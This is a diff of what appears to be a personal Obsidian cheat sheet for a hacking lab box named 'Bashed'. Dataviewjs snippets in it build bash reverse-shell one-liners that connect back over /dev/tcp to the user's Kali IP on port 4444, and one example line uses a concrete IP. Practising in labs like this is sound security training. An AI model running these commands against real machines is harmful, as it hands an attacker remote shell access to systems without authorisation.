@@ -3,7 +3,7 @@ One liner reverse-shell
 ```dataviewjs
 const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `/bin/bash -c 'bash -i >& /dev/tcp/${KaliIP}/LISTENING_PORT 0>&1'`;
+const command = `/bin/bash -c 'bash -i >& /dev/tcp/${KaliIP}/4444 0>&1'`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -59,11 +59,13 @@ dv.paragraph("```bash\n" + command + "\n```");
 # 🎯 Step 2 — From Web Shell (Target)
 
 If it’s a Linux box (Bashed is), use:
+```dataviewjs
+const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-```
-bash -c "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"
-```
+const command = `bash -c "bash -i >& /dev/tcp/${KaliIP}/4444 0>&1"`;
 
+dv.paragraph("```bash\n" + command + "\n```");
+```
 Example:
 
 bash -c "bash -i >& /dev/tcp/10.10.16.35/4444 0>&1"
